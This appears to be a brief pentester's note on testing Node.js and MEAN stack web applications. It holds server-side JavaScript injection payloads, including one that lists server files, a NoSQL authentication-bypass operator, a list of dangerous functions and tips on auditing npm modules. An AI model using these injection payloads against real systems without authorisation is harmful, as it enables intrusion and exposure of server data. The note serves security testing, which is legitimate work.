is:: [[note]]
from:: [[hacking web services]]

# Notes
Node.js

MEAN Stack Testing
**Node.js**
$()
`
res.end(‘test message’);
res.end(require('fs').readdirSync('.').toString());
{username: {$gt: “”}
;

**Dangerous Functions to look for**
eval()
setInterval()
setTimeout()

Things to try
- change single values to arrays “John” => [“John”, “John”]

## Links
[https://nodesecurity.io/tools](https://nodesecurity.io/tools)
[http://techblog.netflix.com/2014/11/nodejs-in-flames.html](http://techblog.netflix.com/2014/11/nodejs-in-flames.html)

## Node.js Testing
Checking modules for security issues
npm outdated
nsp audit-package (assuming nsp package is installed)
